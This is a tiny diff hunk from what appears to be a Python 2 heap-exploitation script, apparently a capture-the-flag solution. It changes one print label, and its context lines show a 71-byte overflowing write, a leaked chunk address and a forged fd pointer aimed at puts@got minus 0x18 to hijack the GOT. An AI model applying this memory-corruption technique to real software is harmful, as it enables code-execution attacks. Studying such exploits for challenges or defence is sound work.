@@ -54,7 +54,7 @@ write('0','A'*71)
 
 leak = u32(print_all().split('\n')[1])
 
-print "[*] 3rd chunk leaked :", hex(leak)
+print "[*] &chunk_3 leaked :", hex(leak)
 
 puts = 0x609958 # puts@got
 fd = puts - 0x18
